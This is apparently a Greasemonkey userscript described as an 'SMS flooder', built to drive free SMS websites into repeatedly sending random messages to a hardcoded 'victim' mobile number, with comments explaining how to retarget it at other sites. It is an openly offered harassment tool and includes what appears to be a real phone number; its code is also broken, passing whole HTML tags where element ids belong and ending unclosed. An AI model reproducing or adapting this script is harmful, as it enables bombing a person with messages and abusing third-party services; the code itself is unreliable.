// ==UserScript==
// @name          soham
// @namespace     Yash
// @description   flooder sms
// @include       http://*160by2.com/*
//                ^^ Replace this with the site using which u want to flood eg http://*way2sms.com/*
// ==/UserScript==

var victim=9762683968; //9762683968
var delay=0; // Enter delay in milliseconds if required
var initialPage='http://ultoo.com/home.php?zxcoiesesscd=23181'; //Enter url of compose message page in the site
var finalPage='http://ultoo.com/msgSent.php?zxcoiesesscd=76509';  //Enter url of confirmation page in the site.
var mobilenoid='<input type="text" maxlength="10" value="10 digit mobile number" onblur="javascript:FillValueOnBlur('MobileNos','10 digit mobile number');" onfocus="javascript:FillValueOnFocus('MobileNos','10 digit mobile number');" name="MobileNos" id="MobileNos" class="number_textfield_inner">'; // Id of the text box where u put mobile no.
var messageid='<textarea cols="" rows="" name="Message" id="Message" class="text_message_box_inner_11_may_2012" onfocus="javascript:FillValueOnFocus('Message','Enter your SMS text here...');
						 			textCounter1(document.frmSendSms.Message,'remLen1',document.frmSendSms.MessageLength.value);" onblur="javascript:FillValueOnBlur('Message','Enter your SMS text here...');" onkeydown="javascript:textCounter1(document.frmSendSms.Message,'remLen1',document.frmSendSms.MessageLength.value);" onkeyup="javascript:textCounter1(document.frmSendSms.Message,'remLen1',document.frmSendSms.MessageLength.value);">Enter your SMS text here...</textarea>'; //Id of the text box where u type the message
var submitid='<input type="submit" name="BtnSendNow" value="Send Now" onclick="return validateFrmSendSmsHomePage(false);">'; // Id of the submit(or send sms) button

//To get id, right click on the textbox or submit button and click on inspect elemet. and copy the id part of the highlighted portion. (using chrome) 

if(document.location==initialPage)
{
document.getElementById(mobilenoid).value=victim;
document.getElementById(messageid).value=Math.floor(Math.random()*1456484)+'Yehlo krlo flood!!'+Math.floor(Math.random()*1456484);
void(0);
document.getElementById(submitid).click();
}

if(document.location==finalPage)
{
setTimeout('document.location=initialPage',delay);